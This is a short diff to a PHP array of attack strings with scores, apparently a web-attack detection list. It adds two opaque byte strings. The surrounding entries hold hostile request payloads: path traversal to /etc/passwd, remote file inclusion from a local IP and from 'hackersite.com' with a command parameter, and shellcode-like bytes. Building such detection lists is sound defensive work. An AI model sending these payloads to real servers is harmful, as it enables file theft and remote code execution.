@@ -92,6 +92,8 @@ $attack_suffix = [
     '?user=admin&amount=100000' => 5,
     '%2e%2e%2f%2e%2e%2f%2e%2e%2ffile:///etc/passwd' => 3,
     '?form=\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x80\xe8\xdc\xff\xff\xff/bin/git' => 3,
+    '\xf5@~\xcc\r\xfdKJ\x0c=u[c\xfb+3\x88\xd2%z' => 3,
+    '\xf9\xa9\xa5\xcc\xa87\x17,b\xfe%\xb4C\x8f\xf3\xf9\xd4\xb4K\xb9Z\x90\x06>?\xf6\xddz\xf3P\xd3{\xa8' => 3,
     '?page=/../../../../../../etc/passwd' => 3,
     '?page=http://192.168.80.128/rfi.php' => 3,
     '?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php' => 5,
